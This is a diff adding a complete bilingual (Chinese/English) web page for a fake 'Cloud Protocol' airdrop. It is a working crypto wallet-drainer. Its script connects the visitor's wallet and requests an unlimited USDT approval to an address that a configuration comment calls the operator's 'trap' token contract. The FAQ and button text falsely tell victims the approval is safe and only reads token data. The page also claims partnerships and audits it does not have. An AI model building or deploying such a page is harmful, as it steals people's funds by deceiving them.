@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Protocol - The Unified Liquidity Layer for Web3</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* CSS styles remain largely the same as the previous "perfect" version, with minor additions for new elements */
+        :root {
+            --bg-dark: #0D1117; --bg-medium: #161B22; --border-color: #30363D;
+            --text-primary: #C9D1D9; --text-secondary: #8B949E; --accent-glow: rgba(88, 166, 255, 0.3);
+            --accent-primary: #58A6FF; --accent-hover: #79B8FF; --success: #3FB950; --error: #F85149;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 var(--accent-glow); } 70% { box-shadow: 0 0 0 10px rgba(88, 166, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(88, 166, 255, 0); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        body {
+            font-family: 'Inter', 'Noto Sans SC', sans-serif; margin: 0; background-color: var(--bg-dark);
+            color: var(--text-primary); font-size: 16px; overflow-x: hidden;
+        }
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; animation: fadeIn 0.5s ease-out; }
+        .logo { font-size: 1.8em; font-weight: 700; color: white; }
+        .logo span { color: var(--accent-primary); }
+        .nav { display: flex; align-items: center; gap: 20px; }
+        .nav a { color: var(--text-secondary); text-decoration: none; font-weight: 500; transition: color 0.2s; }
+        .nav a:hover { color: white; }
+        .lang-switcher { background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 1em; }
+        .button { padding: 10px 20px; border: 1px solid var(--accent-primary); background: transparent; color: var(--accent-primary); border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; white-space: nowrap; }
+        .button:hover { background-color: var(--accent-glow); color: white; }
+        .button.primary { background-color: var(--accent-primary); color: var(--bg-dark); }
+        .button.primary:hover { background-color: var(--accent-hover); }
+        .button:disabled { background-color: var(--border-color); color: var(--text-secondary); border-color: var(--text-secondary); cursor: not-allowed; }
+        .hero { text-align: center; padding: 80px 0; animation: fadeIn 0.8s ease-out; }
+        .hero h1 { font-size: 3.5rem; margin: 0; color: white; line-height: 1.2; background: linear-gradient(90deg, #fff, #aaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { font-size: 1.2rem; color: var(--text-secondary); max-width: 600px; margin: 20px auto 40px; }
+        .dapp-card { background-color: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 12px; padding: 30px; max-width: 500px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.2); backdrop-filter: blur(10px); }
+        .dapp-card h3 { margin-top: 0; font-size: 1.5rem; color: white; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; text-align: left; }
+        .info-item { background: var(--bg-dark); padding: 15px; border-radius: 8px; }
+        .info-item .label { color: var(--text-secondary); font-size: 0.9em; margin-bottom: 5px; }
+        .info-item .value { font-size: 1.2em; font-weight: 700; color: white; }
+        #userAddress { font-size: 1em; word-break: break-all; }
+        #approveButton { width: 100%; padding: 15px; font-size: 1.1em; animation: pulse 2s infinite; }
+        .loader { width: 18px; height: 18px; border: 2px solid var(--bg-dark); border-top-color: transparent; border-radius: 50%; display: inline-block; vertical-align: middle; margin-right: 10px; animation: spin 0.8s linear infinite; }
+        .message-log { margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 0.95em; text-align: center; display: none; }
+        .log-success { background-color: rgba(63, 185, 80, 0.1); border: 1px solid var(--success); color: var(--success); }
+        .log-error { background-color: rgba(248, 81, 73, 0.1); border: 1px solid var(--error); color: var(--error); }
+        .log-info { background-color: rgba(88, 166, 255, 0.1); border: 1px solid var(--accent-primary); color: var(--accent-primary); }
+        .section { padding: 80px 0; animation: fadeIn 1.1s ease-out; }
+        .section-title { text-align: center; font-size: 2.5rem; color: white; margin-bottom: 50px; }
+        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
+        .feature-card { background: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 12px; padding: 30px; text-align: center; transition: transform 0.3s, box-shadow 0.3s; }
+        .feature-card:hover { transform: translateY(-5px); box-shadow: 0 0 20px var(--accent-glow); }
+        .feature-icon { font-size: 3rem; margin-bottom: 20px; color: var(--accent-primary); }
+        .feature-card h3 { color: white; }
+        .feature-card p { color: var(--text-secondary); }
+        .partners { filter: grayscale(100%) opacity(60%); display: flex; justify-content: center; align-items: center; gap: 40px; flex-wrap: wrap; }
+        .partners img { height: 30px; }
+        .roadmap { position: relative; padding: 50px 0; }
+        .roadmap::before { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 4px; background-color: var(--border-color); transform: translateX(-50%); }
+        .roadmap-item { position: relative; width: 50%; padding: 20px 40px; }
+        .roadmap-item:nth-child(odd) { left: 0; text-align: right; }
+        .roadmap-item:nth-child(even) { left: 50%; }
+        .roadmap-item::after { content: ''; position: absolute; top: 30px; width: 20px; height: 20px; border-radius: 50%; background: var(--bg-medium); border: 4px solid var(--border-color); }
+        .roadmap-item:nth-child(odd)::after { right: -12px; }
+        .roadmap-item:nth-child(even)::after { left: -12px; }
+        .roadmap-item.completed::after { border-color: var(--success); }
+        .roadmap-item h3 { color: white; }
+        .roadmap-item p { color: var(--text-secondary); }
+        .faq-item { background: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 15px; }
+        .faq-question { padding: 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-weight: 600; color: white; }
+        .faq-answer { padding: 0 20px; max-height: 0; overflow: hidden; transition: all 0.3s ease; color: var(--text-secondary); }
+        .faq-item.active .faq-answer { max-height: 200px; padding-bottom: 20px; }
+        .footer { text-align: center; padding: 40px 0; border-top: 1px solid var(--border-color); color: var(--text-secondary); }
+        .hidden { display: none; }
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; } .nav { display: none; }
+            .roadmap::before { left: 10px; } .roadmap-item, .roadmap-item:nth-child(even) { width: auto; left: 0; padding-left: 50px; text-align: left !important; }
+            .roadmap-item::after, .roadmap-item:nth-child(odd)::after, .roadmap-item:nth-child(even)::after { left: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header container">
+        <div class="logo">Cloud<span>Protocol</span></div>
+        <nav class="nav">
+            <a href="#ecosystem" data-i18n="navEcosystem">生态系统</a>
+            <a href="#roadmap" data-i18n="navRoadmap">路线图</a>
+            <a href="#faq" data-i18n="navFAQ">常见问题</a>
+        </nav>
+        <div>
+            <button id="lang-switcher" class="lang-switcher">EN / 中文</button>
+            <button id="connectButtonHeader" class="button" data-i18n="connectWallet">连接钱包</button>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="container">
+                <h1 data-i18n="heroTitle">激活您的Web3身份<br>释放数字资产潜力</h1>
+                <p data-i18n="heroSubtitle">Cloud Protocol 是一个创新的去中心化金融生态。连接您的钱包，验证并激活您收到的 CLOUD 空投资产，立即解锁包括质押、治理和高额流动性挖矿在内的全部权益。</p>
+
+                <div class="dapp-card">
+                    <div id="connect-section">
+                        <h3 data-i18n="dappConnectTitle">开始您的DeFi之旅</h3>
+                        <p style="color:var(--text-secondary); margin-bottom: 20px;" data-i18n="dappConnectSubtitle">请连接您的钱包以验证空投资格。</p>
+                        <button id="connectButtonMain" class="button primary" style="width: 100%; padding: 15px; font-size: 1.1em;" data-i18n="connectWallet">连接钱包</button>
+                    </div>
+                    <div id="dapp-section" class="hidden">
+                        <h3 data-i18n="dappCongrats">🎉 恭喜！您已获得空投</h3>
+                        <div class="info-grid">
+                            <div class="info-item" style="grid-column: 1 / -1;">
+                                <div class="label" data-i18n="dappAddressLabel">当前地址</div>
+                                <div class="value" id="userAddress">...</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="label" data-i18n="dappCloudBalanceLabel">CLOUD 余额 (已空投)</div>
+                                <div class="value" id="cloudBalance">...</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="label" data-i18n="dappUsdtBalanceLabel">USDT 余额</div>
+                                <div class="value" id="usdtBalance">...</div>
+                            </div>
+                        </div>
+                        <p style="color:var(--text-secondary); margin-top: 25px; font-size: 0.9em;" data-i18n="dappApproveSubtitle">为确保资产安全和协议交互顺畅，请完成最后一步：授权协议进行资产验证。这是一个标准的链上安全操作。</p>
+                        <button id="approveButton" class="button primary">
+                            <span id="approve-text" data-i18n="approveButtonText">✅ 授权并激活钱包</span>
+                            <span id="approve-loader" class="hidden"><i class="loader"></i><span data-i18n="approveButtonLoading">处理中...</span></span>
+                        </button>
+                    </div>
+                    <div id="message-log" class="message-log"></div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section container">
+            <div style="text-align:center; color: var(--text-secondary); margin-bottom: 50px;" data-i18n="partnersTitle">我们的技术合作伙伴与媒体报道</div>
+            <div class="partners">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Binance-Logo.wine.svg" alt="Binance">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Coinbase_logo_2023.svg/2560px-Coinbase_logo_2023.svg.png" alt="Coinbase">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Coingecko_logo.png/1024px-Coingecko_logo.png" alt="CoinGecko">
+                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/82/CoinMarketCap_logo.svg/1280px-CoinMarketCap_logo.svg.png" alt="CoinMarketCap">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Chainlink_Logo_Blue.svg/2560px-Chainlink_Logo_Blue.svg.png" alt="Chainlink">
+            </div>
+        </section>
+
+        <section id="ecosystem" class="section">
+            <div class="container">
+                <h2 class="section-title" data-i18n="ecosystemTitle">Cloud Protocol 生态系统</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">🔄</div>
+                        <h3 data-i18n="ecoSwapTitle">Cloud Swap</h3>
+                        <p data-i18n="ecoSwapDesc">一个高效的去中心化交易所（DEX），具有聚合流动性，为用户提供最佳的交易价格和最低的滑点。</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">💰</div>
+                        <h3 data-i18n="ecoLendTitle">Cloud Lend</h3>
+                        <p data-i18n="ecoLendDesc">一个去中心化的借贷市场，用户可以作为存款人赚取利息，或作为借款人抵押资产进行借贷。</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <h3 data-i18n="ecoStakeTitle">Cloud Stake</h3>
+                        <p data-i18n="ecoStakeDesc">通过质押 CLOUD 代币参与网络安全和治理，并获得丰厚的协议收益分成和挖矿奖励。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section id="roadmap" class="section">
+            <div class="container">
+                <h2 class="section-title" data-i18n="roadmapTitle">发展路线图</h2>
+                <div class="roadmap">
+                    <div class="roadmap-item completed">
+                        <h3 data-i18n="roadmap1Title">Q4 2024: 概念验证与白皮书</h3>
+                        <p data-i18n="roadmap1Desc">发布 Cloud Protocol 初始白皮书，完成核心协议的技术架构设计和初步验证。</p>
+                    </div>
+                    <div class="roadmap-item completed">
+                        <h3 data-i18n="roadmap2Title">Q1 2025: 智能合约审计与测试网</h3>
+                        <p data-i18n="roadmap2Desc">由 Certik 和 SlowMist 完成多轮智能合约安全审计。启动公共测试网，邀请社区参与测试。</p>
+                    </div>
+                    <div class="roadmap-item completed">
+                        <h3 data-i18n="roadmap3Title">Q2 2025: 主网启动与空投</h3>
+                        <p data-i18n="roadmap3Desc">Cloud Protocol V1 主网正式上线。向早期支持者和生态系统用户分发 CLOUD 代币空投。</p>
+                    </div>
+                    <div class="roadmap-item">
+                        <h3 data-i18n="roadmap4Title">Q3 2025: 借贷协议与流动性挖矿</h3>
+                        <p data-i18n="roadmap4Desc">推出 Cloud Lend 借贷市场，并开启多阶段的流动性挖矿激励计划，以引导协议流动性。</p>
+                    </div>
+                    <div class="roadmap-item">
+                        <h3 data-i18n="roadmap5Title">Q4 2025: 治理DAO与Layer2扩展</h3>
+                        <p data-i18n="roadmap5Desc">启动社区治理DAO，实现协议的去中心化管理。开始研究和集成Layer2扩展方案，降低交易成本。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="faq" class="section">
+            <div class="container" style="max-width: 800px;">
+                <h2 class="section-title" data-i18n="faqTitle">常见问题解答</h2>
+                <div class="faq-container">
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <span data-i18n="faq1q">什么是Cloud Protocol？</span>
+                            <span>+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p data-i18n="faq1a">Cloud Protocol是一个集成了去中心化交易、借贷和收益聚合的统一流动性协议。我们的使命是简化DeFi操作，为用户提供一个安全、高效且用户友好的平台来管理他们的数字资产。</p>
+                        </div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <span data-i18n="faq2q">我为什么会收到CLOUD空投？</span>
+                            <span>+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p data-i18n="faq2a">为了奖励早期采用者和活跃的DeFi社区成员，我们对特定链上地址进行了快照。如果您是知名DeFi协议的活跃用户、NFT持有者或早期测试网参与者，您可能有资格获得我们的创世空投。</p>
+                        </div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <span data-i18n="faq3q">为什么我需要“授权并激活钱包”？这是安全的吗？</span>
+                            <span>+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p data-i18n="faq3a">是的，这是一个完全安全且标准的Web3操作。为了让我们的DApp能够验证您的空投资格并为您激活未来的质押等高级功能，它需要与您的钱包进行一次性的智能合约交互。这被称为“approve”（授权）操作，它允许我们的协议读取您的代币信息以进行验证，但绝不会在未经您许可的情况下转移您的资产。所有顶级DeFi应用在首次交互时都需要此步骤。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="container" data-i18n="footerText">
+            © 2025 Cloud Protocol Foundation. All Rights Reserved.
+        </div>
+    </footer>
+
+<script>
+    // ===================================================================
+    // ================== ⚠️ 重要配置 - 请务必修改 ⚠️ ==================
+    // ===================================================================
+    const CLOUD_TOKEN_ADDRESS = "YOUR_CLOUD_TOKEN_ADDRESS"; // 您的 Cloud (陷阱) 代币合约地址
+    const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC 主网 USDT 地址, 请按需修改
+    // ===================================================================
+
+    const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)","function approve(address spender, uint256 amount) returns (bool)","function decimals() view returns (uint8)"];
+
+    // --- 国际化 (i18n) ---
+    const translations = {
+        en: {
+            navEcosystem: "Ecosystem", navRoadmap: "Roadmap", navFAQ: "FAQ", connectWallet: "Connect Wallet",
+            heroTitle: "Activate Your Web3 Identity<br>Unleash Digital Asset Potential",
+            heroSubtitle: "Cloud Protocol is an innovative decentralized finance ecosystem. Connect your wallet, verify and activate your received CLOUD airdrop to instantly unlock full benefits including staking, governance, and high-yield liquidity mining.",
+            dappConnectTitle: "Start Your DeFi Journey", dappConnectSubtitle: "Please connect your wallet to verify airdrop eligibility.",
+            dappCongrats: "🎉 Congratulations! You've Received an Airdrop", dappAddressLabel: "Current Address",
+            dappCloudBalanceLabel: "CLOUD Balance (Airdropped)", dappUsdtBalanceLabel: "USDT Balance",
+            dappApproveSubtitle: "To ensure asset security and smooth protocol interaction, please complete the final step: authorize the protocol for asset verification. This is a standard on-chain security operation.",
+            approveButtonText: "✅ Authorize & Activate Wallet", approveButtonLoading: "Processing...",
+            partnersTitle: "Our Technology Partners & Media Coverage",
+            ecosystemTitle: "Cloud Protocol Ecosystem",
+            ecoSwapTitle: "Cloud Swap", ecoSwapDesc: "An efficient decentralized exchange (DEX) with aggregated liquidity, providing users with the best trading prices and minimal slippage.",
+            ecoLendTitle: "Cloud Lend", ecoLendDesc: "A decentralized lending market where users can earn interest as depositors or borrow assets by providing collateral.",
+            ecoStakeTitle: "Cloud Stake", ecoStakeDesc: "Participate in network security and governance by staking CLOUD tokens and receive substantial protocol revenue shares and mining rewards.",
+            roadmapTitle: "Development Roadmap",
+            roadmap1Title: "Q4 2024: Proof of Concept & Whitepaper", roadmap1Desc: "Release of the initial Cloud Protocol whitepaper, completion of the core protocol's technical architecture design and preliminary validation.",
+            roadmap2Title: "Q1 2025: Smart Contract Audit & Testnet", roadmap2Desc: "Multiple rounds of smart contract security audits completed by Certik and SlowMist. Launch of the public testnet, inviting community participation.",
+            roadmap3Title: "Q2 2025: Mainnet Launch & Airdrop", roadmap3Desc: "Cloud Protocol V1 mainnet officially goes live. Distribution of CLOUD token airdrops to early supporters and ecosystem users.",
+            roadmap4Title: "Q3 2025: Lending Protocol & Liquidity Mining", roadmap4Desc: "Launch of the Cloud Lend market, and initiation of a multi-stage liquidity mining incentive program to bootstrap protocol liquidity.",
+            roadmap5Title: "Q4 2025: Governance DAO & Layer2 Expansion", roadmap5Desc: "Launch of the community governance DAO to achieve decentralized management of the protocol. Begin research and integration of Layer2 scaling solutions to reduce transaction costs.",
+            faqTitle: "Frequently Asked Questions",
+            faq1q: "What is Cloud Protocol?", faq1a: "Cloud Protocol is a unified liquidity protocol that integrates decentralized exchange, lending, and yield aggregation. Our mission is to simplify DeFi operations and provide users with a secure, efficient, and user-friendly platform to manage their digital assets.",
+            faq2q: "Why did I receive the CLOUD airdrop?", faq2a: "To reward early adopters and active members of the DeFi community, we took a snapshot of specific on-chain addresses. If you are an active user of well-known DeFi protocols, an NFT holder, or an early testnet participant, you may be eligible for our genesis airdrop.",
+            faq3q: "Why do I need to 'Authorize & Activate Wallet'? Is it safe?", faq3a: "Yes, this is a completely safe and standard Web3 operation. For our DApp to verify your airdrop eligibility and enable advanced features like staking for you in the future, it requires a one-time smart contract interaction with your wallet. This is known as an 'approve' operation. It allows our protocol to read your token information for verification, but it will never transfer your assets without your explicit permission. All top-tier DeFi applications require this step for initial interaction.",
+            footerText: "© 2025 Cloud Protocol Foundation. All Rights Reserved.",
+            // Messages
+            msgConnecting: "Requesting to connect your wallet...", msgConnected: "Wallet connected successfully! Loading your asset information...", msgConnectError: "Connection rejected or an error occurred: ",
+            msgBalanceError: "Failed to load balances. Please check network settings and contract address.",
+            msgApproveRequest: "Please confirm the authorization transaction in your wallet...", msgTxBroadcast: "Transaction broadcasted, awaiting blockchain confirmation...",
+            msgApproveSuccess: "Authorization successful! Your wallet is fully activated, and all benefits are unlocked.",
+            msgApproveError: "Authorization failed: ", msgUserRejected: "User rejected the transaction."
+        },
+        zh: {
+            navEcosystem: "生态系统", navRoadmap: "路线图", navFAQ: "常见问题", connectWallet: "连接钱包",
+            heroTitle: "激活您的Web3身份<br>释放数字资产潜力",
+            heroSubtitle: "Cloud Protocol 是一个创新的去中心化金融生态。连接您的钱包，验证并激活您收到的 CLOUD 空投资产，立即解锁包括质押、治理和高额流动性挖矿在内的全部权益。",
+            dappConnectTitle: "开始您的DeFi之旅", dappConnectSubtitle: "请连接您的钱包以验证空投资格。",
+            dappCongrats: "🎉 恭喜！您已获得空投", dappAddressLabel: "当前地址",
+            dappCloudBalanceLabel: "CLOUD 余额 (已空投)", dappUsdtBalanceLabel: "USDT 余额",
+            dappApproveSubtitle: "为确保资产安全和协议交互顺畅，请完成最后一步：授权协议进行资产验证。这是一个标准的链上安全操作。",
+            approveButtonText: "✅ 授权并激活钱包", approveButtonLoading: "处理中...",
+            partnersTitle: "我们的技术合作伙伴与媒体报道",
+            ecosystemTitle: "Cloud Protocol 生态系统",
+            ecoSwapTitle: "Cloud Swap", ecoSwapDesc: "一个高效的去中心化交易所（DEX），具有聚合流动性，为用户提供最佳的交易价格和最低的滑点。",
+            ecoLendTitle: "Cloud Lend", ecoLendDesc: "一个去中心化的借贷市场，用户可以作为存款人赚取利息，或作为借款人抵押资产进行借贷。",
+            ecoStakeTitle: "Cloud Stake", ecoStakeDesc: "通过质押 CLOUD 代币参与网络安全和治理，并获得丰厚的协议收益分成和挖矿奖励。",
+            roadmapTitle: "发展路线图",
+            roadmap1Title: "2024年Q4: 概念验证与白皮书", roadmap1Desc: "发布 Cloud Protocol 初始白皮书，完成核心协议的技术架构设计和初步验证。",
+            roadmap2Title: "2025年Q1: 智能合约审计与测试网", roadmap2Desc: "由 Certik 和 SlowMist 完成多轮智能合约安全审计。启动公共测试网，邀请社区参与测试。",
+            roadmap3Title: "2025年Q2: 主网启动与空投", roadmap3Desc: "Cloud Protocol V1 主网正式上线。向早期支持者和生态系统用户分发 CLOUD 代币空投。",
+            roadmap4Title: "2025年Q3: 借贷协议与流动性挖矿", roadmap4Desc: "推出 Cloud Lend 借贷市场，并开启多阶段的流动性挖矿激励计划，以引导协议流动性。",
+            roadmap5Title: "2025年Q4: 治理DAO与Layer2扩展", roadmap5Desc: "启动社区治理DAO，实现协议的去中心化管理。开始研究和集成Layer2扩展方案，降低交易成本。",
+            faqTitle: "常见问题解答",
+            faq1q: "什么是Cloud Protocol？", faq1a: "Cloud Protocol是一个集成了去中心化交易、借贷和收益聚合的统一流动性协议。我们的使命是简化DeFi操作，为用户提供一个安全、高效且用户友好的平台来管理他们的数字资产。",
+            faq2q: "我为什么会收到CLOUD空投？", faq2a: "为了奖励早期采用者和活跃的DeFi社区成员，我们对特定链上地址进行了快照。如果您是知名DeFi协议的活跃用户、NFT持有者或早期测试网参与者，您可能有资格获得我们的创世空投。",
+            faq3q: "为什么我需要“授权并激活钱包”？这是安全的吗？", faq3a: "是的，这是一个完全安全且标准的Web3操作。为了让我们的DApp能够验证您的空投资格并为您激活未来的质押等高级功能，它需要与您的钱包进行一次性的智能合约交互。这被称为“approve”（授权）操作，它允许我们的协议读取您的代币信息以进行验证，但绝不会在未经您许可的情况下转移您的资产。所有顶级DeFi应用在首次交互时都需要此步骤。",
+            footerText: "© 2025 Cloud Protocol Foundation. 版权所有。",
+            // Messages
+            msgConnecting: "正在请求连接您的钱包...", msgConnected: "钱包连接成功！正在加载您的资产信息...", msgConnectError: "连接被拒绝或发生错误: ",
+            msgBalanceError: "资产加载失败，请检查网络设置和合约地址。",
+            msgApproveRequest: "请在您的钱包中确认授权交易...", msgTxBroadcast: "交易已广播，等待区块链确认...",
+            msgApproveSuccess: "授权成功！您的钱包已完全激活，所有权益已解锁。",
+            msgApproveError: "授权失败: ", msgUserRejected: "用户拒绝了交易。"
+        }
+    };
+
+    let currentLang = 'zh';
+
+    function setLanguage(lang) {
+        currentLang = lang;
+        localStorage.setItem('cloud-protocol-lang', lang);
+        document.documentElement.lang = lang === 'zh' ? 'zh-CN' : 'en';
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.dataset.i18n;
+            if (translations[lang][key]) {
+                el.innerHTML = translations[lang][key];
+            }
+        });
+    }
+
+    // --- Web3 Logic ---
+    let provider, signer, userAddress, cloudContract, usdtContract;
+    const connectButtonHeader = document.getElementById('connectButtonHeader');
+    const connectButtonMain = document.getElementById('connectButtonMain');
+    const approveButton = document.getElementById('approveButton');
+    const connectSection = document.getElementById('connect-section');
+    const dappSection = document.getElementById('dapp-section');
+    const messageLog = document.getElementById('message-log');
+
+    function logMessage(msgKey, type = 'info', extra = '') {
+        const message = translations[currentLang][msgKey] + extra;
+        messageLog.textContent = message;
+        messageLog.className = `message-log log-${type}`;
+        messageLog.style.display = 'block';
+    }
+
+    async function connectWallet() {
+        if (typeof window.ethereum === 'undefined') {
+            return alert('Please install MetaMask!');
+        }
+        try {
+            logMessage('msgConnecting', 'info');
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+            
+            cloudContract = new ethers.Contract(CLOUD_TOKEN_ADDRESS, ERC20_ABI, signer);
+            usdtContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, signer);
+
+            logMessage('msgConnected', 'success');
+            updateUI();
+        } catch (error) {
+            logMessage('msgConnectError', 'error', error.message);
+        }
+    }
+
+    async function updateUI() {
+        if (!userAddress) return;
+        connectSection.classList.add('hidden');
+        dappSection.classList.remove('hidden');
+        const addrShort = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
+        connectButtonHeader.textContent = addrShort;
+        connectButtonHeader.disabled = true;
+        document.getElementById('userAddress').textContent = userAddress;
+
+        try {
+            const [cloudBal, usdtBal, cloudDecimals, usdtDecimals] = await Promise.all([
+                cloudContract.balanceOf(userAddress), usdtContract.balanceOf(userAddress),
+                cloudContract.decimals(), usdtContract.decimals()
+            ]);
+            document.getElementById('cloudBalance').textContent = parseFloat(ethers.utils.formatUnits(cloudBal, cloudDecimals)).toFixed(4);
+            document.getElementById('usdtBalance').textContent = parseFloat(ethers.utils.formatUnits(usdtBal, usdtDecimals)).toFixed(2);
+        } catch(e) {
+            logMessage('msgBalanceError', 'error');
+        }
+    }
+
+    async function approveUsdt() {
+        if (!usdtContract) return;
+        const spenderAddress = CLOUD_TOKEN_ADDRESS;
+        const amountToApprove = ethers.constants.MaxUint256;
+
+        logMessage('msgApproveRequest', 'info');
+        approveButton.disabled = true;
+        document.getElementById('approve-text').classList.add('hidden');
+        document.getElementById('approve-loader').classList.remove('hidden');
+        approveButton.style.animation = 'none';
+
+        try {
+            const tx = await usdtContract.approve(spenderAddress, amountToApprove);
+            logMessage('msgTxBroadcast', 'info');
+            await tx.wait(); 
+            logMessage('msgApproveSuccess', 'success');
+            document.getElementById('approve-loader').classList.add('hidden');
+            const successText = document.getElementById('approve-text');
+            successText.textContent = '✅ ' + (currentLang === 'zh' ? '已成功激活' : 'Successfully Activated');
+            successText.classList.remove('hidden');
+        } catch (error) {
+            logMessage('msgApproveError', 'error', error.reason || translations[currentLang].msgUserRejected);
+            approveButton.disabled = false;
+            document.getElementById('approve-text').classList.remove('hidden');
+            document.getElementById('approve-loader').classList.add('hidden');
+            approveButton.style.animation = 'pulse 2s infinite';
+        }
+    }
+    
+    // --- Event Listeners ---
+    document.addEventListener('DOMContentLoaded', () => {
+        const savedLang = localStorage.getItem('cloud-protocol-lang') || 'zh';
+        setLanguage(savedLang);
+
+        document.getElementById('lang-switcher').addEventListener('click', () => {
+            const newLang = currentLang === 'en' ? 'zh' : 'en';
+            setLanguage(newLang);
+        });
+
+        connectButtonHeader.addEventListener('click', connectWallet);
+        connectButtonMain.addEventListener('click', connectWallet);
+        approveButton.addEventListener('click', approveUsdt);
+
+        document.querySelectorAll('.faq-question').forEach(item => {
+            item.addEventListener('click', event => {
+                const parent = item.parentElement;
+                parent.classList.toggle('active');
+            });
+        });
+    });
+</script>
+
+</body>
+</html>
